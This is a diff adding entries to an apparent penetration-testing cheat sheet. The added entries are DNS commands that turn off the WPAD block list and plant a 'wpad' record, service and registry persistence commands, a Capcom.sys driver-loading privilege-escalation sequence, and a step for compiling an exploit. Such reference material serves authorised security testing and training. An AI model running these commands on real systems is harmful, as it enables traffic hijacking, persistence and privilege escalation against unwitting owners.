@@ -503,6 +503,8 @@ $ ./subbrute.py <domain.tld> -s ./names.txt -r ./resolvers.txt        # $ echo "
 https://github.com/EdOverflow/can-i-take-over-xyz
 https://www.ettercap-project.org/
 https://www.bettercap.org/
+PS C:\> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <hostname>
+PS C:\> Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain< -ComputerName <hostname> -IPv4Address <IP address>
 ```
 
 - TFTP (udp/port 69)
@@ -2389,6 +2391,23 @@ $ raiseChild.py -target-exec <IP address> <domain>/<username>
 #6. - Persistence
 -----------------------------------------
 
+- Services
+
+```
+C:\> sc.exe sdshow <service>
+C:\> sc query <service>
+C:\> sc stop <service>
+C:\> sc start <service>
+```
+
+- Registry
+
+```
+C:\> reg query <registry key>
+C:\> reg delete <registry key> /v <value>
+C:\> reg add <registry key> /v <value>
+```
+
 #7. - Brute Force
 -----------------------------------------
 
@@ -3771,6 +3790,15 @@ PS C:\> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properti
 PS C:\> qwinsta
 ```
 
+- Driver
+
+```
+C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+C:\> .\DriverView.exe /stext drivers.txt and cat drivers.txt | Select-String -pattern Capcom
+C:\> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+```
+
 #13. - Online Resources
 -----------------------------------------
 
@@ -3832,6 +3860,12 @@ $ gcc src.c -fPIC -shared -o /development/libshared.so
 
 ```
 $ gcc kernel_expoit.c -o kernel_expoit
+```
+
+- Compile C++ Exploit
+
+```
+C:\> cl /DUNICODE /D_UNICODE exploit.cpp
 ```
 
 - EternalBlue - MS17-010
